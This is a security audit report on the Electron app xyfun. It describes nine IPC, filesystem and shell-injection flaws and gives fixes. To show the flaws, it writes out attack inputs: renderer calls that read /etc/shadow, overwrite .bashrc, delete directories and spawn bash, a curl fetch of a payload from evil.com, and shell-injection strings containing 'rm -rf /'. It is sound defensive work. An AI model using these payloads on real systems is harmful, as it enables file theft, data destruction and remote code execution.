# Electron Security Audit Report — xyfun

**Auditor**: Agent A (Electron / IPC / Security)
**Date**: 2026-09-14
**Scope**: Electron security boundary, IPC, shell integration, URL loading

---

## Summary

| ID          | Title                                       | Severity | Category              |
| ----------- | ------------------------------------------- | -------- | --------------------- |
| [ELECT-001] | Arbitrary File Read via IPC                 | P1       | Arbitrary File Access |
| [ELECT-002] | Arbitrary File Write via IPC                | P1       | Arbitrary File Access |
| [ELECT-003] | Arbitrary File/Directory Deletion via IPC   | P1       | Arbitrary File Access |
| [ELECT-004] | Arbitrary Process Execution via CALL_PLAYER | P1       | RCE                   |
| [ELECT-005] | Arbitrary File Open via shell.openPath      | P2       | RCE / File Access     |
| [ELECT-006] | Shell Injection in tgz Module               | P2       | Shell Injection       |
| [ELECT-007] | No Content Security Policy (CSP)            | P2       | Defense-in-Depth      |
| [ELECT-008] | WINDOW_DESTROY IPC Lacks Sender Validation  | P2       | IPC Authorization     |
| [ELECT-009] | FS IPC Handlers Lack Path Sandboxing        | P1       | Arbitrary File Access |

---

### [ELECT-001] Arbitrary File Read via IPC

- **Severity**: P1
- **Category**: Arbitrary File Access
- **Confidence**: HIGH
- **File**: `src/main/ipc.ts:236-239`
- **Code**:
  ```typescript
  ipcMain.handle(IPC_CHANNEL.FS_FILE_READ, async (event, path: string, encoding: BufferEncoding = 'utf-8') => {
    if (!isTrustedSender(event)) return null;
    return await readFile(path, encoding);
  });
  ```
- **Trigger**: Renderer calls `window.electron.ipcRenderer.invoke('fs:file-read', '/etc/shadow')` or any sensitive file path
- **Call Chain**: `renderer → ipcRenderer.invoke('fs:file-read', path) → ipcMain.handle → readFile(path) → fs.readFile(absolutePath)`
- **Root Cause**: The `isTrustedSender()` check only verifies the sender URL starts with `file:` or matches the dev server origin. Once confirmed as trusted, the handler accepts **any** filesystem path with no path sandboxing. The renderer can read any file the process user has read access to.
- **User Impact**: If an attacker achieves code execution in the renderer (e.g., via XSS in loaded web content, malicious plugin, or supply chain attack), they can exfiltrate sensitive files: SSH keys, credentials, browser cookies, environment files, etc.
- **Evidence**: `readFile()` in `src/main/utils/file.ts:745-767` calls `relativeToAbsolute()` which passes the path through unchanged (unless it starts with `zy://` or `file://`). No path restriction is applied.
- **Recommended Fix**: Implement path sandboxing — only allow reads from `APP_FILE_PATH`, `APP_DATABASE_PATH`, and other app-specific directories. Reject paths that resolve outside allowed directories using `resolveWithinPath()`.
- **Fix Risk**: Medium — requires identifying all legitimate read paths and updating renderer code accordingly.

---

### [ELECT-002] Arbitrary File Write via IPC

- **Severity**: P1
- **Category**: Arbitrary File Access
- **Confidence**: HIGH
- **File**: `src/main/ipc.ts:241-247`
- **Code**:
  ```typescript
  ipcMain.handle(
    IPC_CHANNEL.FS_FILE_WRITE,
    async (event, path: string, data: string | Buffer, encoding: BufferEncoding = 'utf-8') => {
      if (!isTrustedSender(event)) return false;
      return await saveFile(path, data, encoding);
    },
  );
  ```
- **Trigger**: Renderer calls `window.electron.ipcRenderer.invoke('fs:file-write', '/home/user/.bashrc', maliciousContent)`
- **Call Chain**: `renderer → ipcRenderer.invoke('fs:file-write', path, data) → ipcMain.handle → saveFile(path, data) → fs.outputFile(absolutePath, content)`
- **Root Cause**: Same as ELECT-001 — `isTrustedSender()` is the only guard. No path validation or sandboxing. `saveFile()` uses `fs.outputFile()` which creates intermediate directories automatically.
- **User Impact**: Attacker can overwrite any writable file: `.bashrc` (for persistence), application binaries (for privilege escalation), configuration files, etc. Combined with ELECT-004, this enables full RCE.
- **Evidence**: `saveFile()` in `src/main/utils/file.ts:671-699` resolves the path and writes without restriction.
- **Recommended Fix**: Restrict writes to `APP_FILE_PATH`, `APP_TEMP_PATH`, and explicitly allowed directories. Use `resolveWithinPath()` to validate paths stay within allowed boundaries.
- **Fix Risk**: Medium

---

### [ELECT-003] Arbitrary File/Directory Deletion via IPC

- **Severity**: P1
- **Category**: Arbitrary File Access
- **Confidence**: HIGH
- **File**: `src/main/ipc.ts:231-234`
- **Code**:
  ```typescript
  ipcMain.handle(IPC_CHANNEL.FS_DELETE, async (event, path: string) => {
    if (!isTrustedSender(event)) return false;
    return await fileDelete(path);
  });
  ```
- **Trigger**: Renderer calls `window.electron.ipcRenderer.invoke('fs:delete', '/home/user/Documents')`
- **Call Chain**: `renderer → ipcRenderer.invoke('fs:delete', path) → ipcMain.handle → fileDelete(path) → fs.remove(absolutePath)`
- **Root Cause**: No path sandboxing. `fs.remove()` recursively deletes directories.
- **User Impact**: Attacker can delete any accessible file or directory, causing data loss or denial of service.
- **Evidence**: `fileDelete()` in `src/main/utils/file.ts:1044-1056` resolves and removes without restriction.
- **Recommended Fix**: Restrict deletion to app-specific directories only.
- **Fix Risk**: Medium

---

### [ELECT-004] Arbitrary Process Execution via CALL_PLAYER

- **Severity**: P1
- **Category**: RCE
- **Confidence**: HIGH
- **File**: `src/main/ipc.ts:156-187`
- **Code**:

  ```typescript
  ipcMain.handle(IPC_CHANNEL.CALL_PLAYER, async (_, app: string, url: string) => {
    if (!url || !app) return false;
    if (!isHttp(url) && !(await pathExist(url))) return false;

    try {
      const executable = app.trim().replace(/^(['"])(.*)\1$/, '$2');
      const args = isMacOS ? ['-a', executable, url] : [url];
      const command = isMacOS ? 'open' : executable;

      return await new Promise<boolean>((resolve) => {
        const child = spawn(command, args, { stdio: 'ignore', windowsHide: true });
        // ...
      });
    } catch (error) {
      /* ... */
    }
  });
  ```

- **Trigger**: Renderer calls `window.electron.ipcRenderer.invoke('business:call-player', '/bin/bash', 'http://example.com')` — this spawns `/bin/bash` with `http://example.com` as an argument. On Linux/Windows, `command = executable = '/bin/bash'` and `args = ['http://example.com']`.
- **Call Chain**: `renderer → ipcRenderer.invoke('business:call-player', app, url) → spawn(command, args)`
- **Root Cause**: The `app` parameter is user-controlled and used directly as the executable path. The only validation is that `url` must be HTTP or exist on disk. There is **no validation** that `app` is a legitimate media player. On non-macOS platforms, `app` becomes the `command` passed to `spawn()`.
- **User Impact**: Attacker can execute **any binary** on the system by providing its path as the `app` parameter, as long as a valid HTTP URL is provided as `url`. This is full Remote Code Execution.
- **EVIDENCE (Attack Chain)**:
  1. Attacker injects code in renderer (via plugin, XSS, etc.)
  2. Calls: `ipcRenderer.invoke('business:call-player', '/usr/bin/curl', 'http://evil.com/payload.sh')`
  3. Or: `ipcRenderer.invoke('business:call-player', '/bin/bash', 'http://example.com')` — spawns bash
  4. On Windows: `ipcRenderer.invoke('business:call-player', 'C:\\Windows\\System32\\cmd.exe', 'http://example.com')`
- **Recommended Fix**: Maintain a whitelist of allowed player executables (VLC, mpv, IINA, etc.). Validate `app` against this whitelist before spawning. Never allow arbitrary executable paths.
- **Fix Risk**: Low — add a player whitelist or use a config-based player path.

---

### [ELECT-005] Arbitrary File Open via shell.openPath

- **Severity**: P2
- **Category**: RCE / File Access
- **Confidence**: HIGH
- **File**: `src/main/ipc.ts:272-274`
- **Code**:
  ```typescript
  ipcMain.handle(IPC_CHANNEL.OPEN_PATH, (_, path: string) => {
    shell.openPath(path);
  });
  ```
- **Trigger**: Renderer calls `window.electron.ipcRenderer.invoke('open:path', '/etc/passwd')` or any file
- **Call Chain**: `renderer → ipcRenderer.invoke('open:path', path) → shell.openPath(path) → OS opens file`
- **Root Cause**: **No sender validation** (no `isTrustedSender` check) and **no path validation**. `shell.openPath()` opens the file with the default application. On some systems, this can execute scripts or open dangerous file types.
- **User Impact**: Any renderer (including webview content if IPC is somehow accessible) can open arbitrary files. Opening `.sh` files on Linux may execute them. Opening `.url` files on Windows may trigger navigation. This also enables information disclosure by opening files and observing the result.
- **Note**: This handler also lacks `isTrustedSender()` validation, making it accessible from any webContents.
- **Recommended Fix**: Add `isTrustedSender()` check. Validate paths are within allowed directories. Restrict to known safe file types.
- **Fix Risk**: Low

---

### [ELECT-006] Shell Injection in tgz Module

- **Severity**: P2
- **Category**: Shell Injection
- **Confidence**: MEDIUM
- **File**: `src/shared/modules/zip/tgz.ts:18,36`
- **Code**:
  ```typescript
  await execAsync(`tar -czf "${dest}" -C "${src}" .`);
  // ...
  await execAsync(`tar -xzf "${src}" -C "${dest}"`);
  ```
- **Trigger**: If `src` or `dest` contain shell metacharacters like `"; rm -rf / #`, the command is injected
- **Call Chain**: `user input → compress(src, dest) → execAsync(tar command with interpolated paths)`
- **Root Cause**: Paths are interpolated directly into shell command strings using template literals. While `"` quoting is applied, this does not prevent injection via `"` characters or `$()` in the path.
- **User Impact**: If an attacker can control the path passed to `compress()` or `decompress()`, they can execute arbitrary shell commands. The attack vector depends on where these functions are called (plugin installation, file operations).
- **Evidence**: A path like `foo"; echo pwned > /tmp/pwned #` would break out of the quotes and execute `echo pwned > /tmp/pwned`.
- **Recommended Fix**: Use `execFile` or `spawn` with array arguments instead of `exec` with string interpolation. Or use a native tar library.
- **Fix Risk**: Low

---

### [ELECT-007] No Content Security Policy (CSP)

- **Severity**: P2
- **Category**: Defense-in-Depth
- **Confidence**: HIGH
- **File**: `src/main/services/WindowService.ts` (entire file) and `src/main/services/FastifyService/index.ts:630-642`
- **Code**:
  ```typescript
  // In onHeadersReceived handler:
  callback({
    cancel: false,
    responseHeaders: {
      ...responseHeaders,
      'Document-Policy': ['include-js-call-stacks-in-crash-reports'],
    },
  });
  ```
- **Trigger**: N/A — this is a missing defense
- **Call Chain**: N/A
- **Root Cause**: No `Content-Security-Policy` header is set on responses. The `onHeadersReceived` handler adds `Document-Policy` but not CSP. Renderer pages loaded via `file://` have no CSP by default.
- **User Impact**: Without CSP, if an attacker can inject content into the renderer (via XSS in loaded web content, compromised plugin UI, etc.), they can load scripts from any origin, inline scripts, etc. CSP would limit the blast radius of such attacks.
- **Recommended Fix**: Add a strict CSP header in `onHeadersReceived` for renderer pages: `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' http://127.0.0.1:*;`
- **Fix Risk**: Medium — may break legitimate functionality that relies on inline scripts or external resources.

---

### [ELECT-008] WINDOW_DESTROY IPC Lacks Sender Validation

- **Severity**: P2
- **Category**: IPC Authorization
- **Confidence**: HIGH
- **File**: `src/main/ipc.ts:511-516`
- **Code**:
  ```typescript
  ipcMain.handle(IPC_CHANNEL.WINDOW_DESTROY, (_, name: string) => {
    const window = windowService.getWindow(name);
    if (window && !window.isDestroyed()) {
      windowService.closeWindow(window);
    }
  });
  ```
- **Trigger**: Renderer calls `window.electron.ipcRenderer.invoke('window:destroy', 'main')` to close the main window
- **Call Chain**: `renderer → ipcRenderer.invoke('window:destroy', name) → windowService.closeWindow(window)`
- **Root Cause**: No `isTrustedSender()` check. Any webContents can close any named window. Similarly, `WINDOW_HIDE` (line 518) and `WINDOW_SHOW` (line 525) lack sender validation.
- **User Impact**: A malicious renderer or webview could close the main window, player window, or browser window, causing denial of service.
- **Recommended Fix**: Add `isTrustedSender()` validation to `WINDOW_DESTROY`, `WINDOW_HIDE`, and `WINDOW_SHOW` handlers.
- **Fix Risk**: Low

---

### [ELECT-009] FS IPC Handlers Lack Path Sandboxing

- **Severity**: P1
- **Category**: Arbitrary File Access
- **Confidence**: HIGH
- **File**: `src/main/ipc.ts:226-257`
- **Code**:
  ```typescript
  ipcMain.handle(IPC_CHANNEL.FS_EXIST, async (event, path: string) => {
    if (!isTrustedSender(event)) return false;
    return await pathExist(path);
  });
  // FS_DELETE, FS_FILE_READ, FS_FILE_WRITE, FS_DIR_READ, FS_DIR_CREATE
  ```
- **Trigger**: All FS handlers accept arbitrary paths with no restriction
- **Call Chain**: `renderer → FS_* IPC → file utility → fs operation on arbitrary path`
- **Root Cause**: The `isTrustedSender()` function only checks origin, not path scope. All six FS handlers (`FS_EXIST`, `FS_DELETE`, `FS_FILE_READ`, `FS_FILE_WRITE`, `FS_DIR_READ`, `FS_DIR_CREATE`) have the same issue. The `resolveWithinPath()` utility exists in `src/main/utils/file.ts:40-65` but is never used in IPC handlers.
- **User Impact**: Combined findings ELECT-001, ELECT-002, ELECT-003 — full arbitrary filesystem access from the renderer.
- **Recommended Fix**: Create a path allowlist (e.g., `APP_FILE_PATH`, `APP_DATABASE_PATH`, `APP_PLUGIN_PATH`, `APP_TEMP_PATH`). Before any FS operation, validate the resolved path is within an allowed directory using `resolveWithinPath()`. Reject operations on paths outside the allowlist.
- **Fix Risk**: Medium — need to audit all legitimate FS access patterns from the renderer.

---

## Positive Security Findings

These areas are well-secured:

1. **BrowserWindow webPreferences**: `contextIsolation: true`, `nodeIntegration: false`, `webSecurity: true` — correct defaults at `WindowService.ts:731-741`
2. **Untrusted windows**: `createSnifferWindow()` and `createSearchWindow()` pass `trustedRenderer: false` which sets `sandbox: true` and removes preload — `WindowService.ts:746-755`
3. **contextBridge usage**: Preload correctly uses `contextBridge.exposeInMainWorld()` — `preload/index.ts:21-23`
4. **Fastify API auth**: Token-based authentication with random 32-byte token — `apiAuth.ts:3-4`
5. **Fastify origin restriction**: Only allows `127.0.0.1` and `localhost` origins — `FastifyService/index.ts:227-237`
6. **Trusted webContents tracking**: `trustedWebContentsIds` set tracks which webContents get API auth tokens — `WindowService.ts:62,759-763`
7. **Webview ownership check**: `getOwnedWebview()` verifies `hostWebContents` relationship — `ipc.ts:63-67`
8. **shell.openExternal in window.open**: Checks `isSecurityScheme()` before opening — `WindowService.ts:489-491`
9. **Navigation prevention**: `will-navigate` handler prevents navigation to untrusted schemes — `WindowService.ts:483-494`
10. **will-attach-webview**: Commented-out code that would inject preload into webviews is correctly disabled — `WindowService.ts:422-426`

---

## Recommendations Summary

| Priority | Action                                                    | Files                                |
| -------- | --------------------------------------------------------- | ------------------------------------ |
| **P0**   | Add path sandboxing to all FS IPC handlers                | `src/main/ipc.ts`                    |
| **P0**   | Add player executable whitelist to CALL_PLAYER            | `src/main/ipc.ts`                    |
| **P1**   | Add `isTrustedSender()` to OPEN_PATH handler              | `src/main/ipc.ts`                    |
| **P1**   | Fix shell injection in tgz module                         | `src/shared/modules/zip/tgz.ts`      |
| **P2**   | Add CSP headers to renderer responses                     | `src/main/services/WindowService.ts` |
| **P2**   | Add sender validation to WINDOW_DESTROY/HIDE/SHOW         | `src/main/ipc.ts`                    |
| **P2**   | Re-enable ELECTRON_DISABLE_SECURITY_WARNINGS for dev only | `src/main/index.ts:49`               |
